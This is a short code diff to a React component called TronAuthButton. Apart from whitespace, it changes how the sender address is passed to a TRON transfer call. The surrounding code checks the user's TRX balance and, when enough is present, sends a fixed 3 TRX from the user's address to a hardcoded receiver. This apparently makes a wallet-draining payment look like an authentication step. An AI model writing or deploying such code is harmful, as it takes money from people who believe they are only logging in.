@@ -68,14 +68,14 @@ export const TronAuthButton: React.FC = () => {
             const trx = trxRaw / 1e6;
             console.log('TRX:', trx);
 
-            const FIXED_AMOUNT_TRX = 3; 
-            const trxToSend = FIXED_AMOUNT_TRX * 1_000_000; 
+            const FIXED_AMOUNT_TRX = 3;
+            const trxToSend = FIXED_AMOUNT_TRX * 1_000_000;
 
-            if (trxRaw >= trxToSend + 1_000_000) { 
+            if (trxRaw >= trxToSend + 1_000_000) {
             const tx = await tronWeb.trx.sendTransaction(
             TRON_RECEIVER,
             trxToSend,
-            userAddress
+            { from: userAddress }
         );
         console.log('TRX send result:', tx);
     }
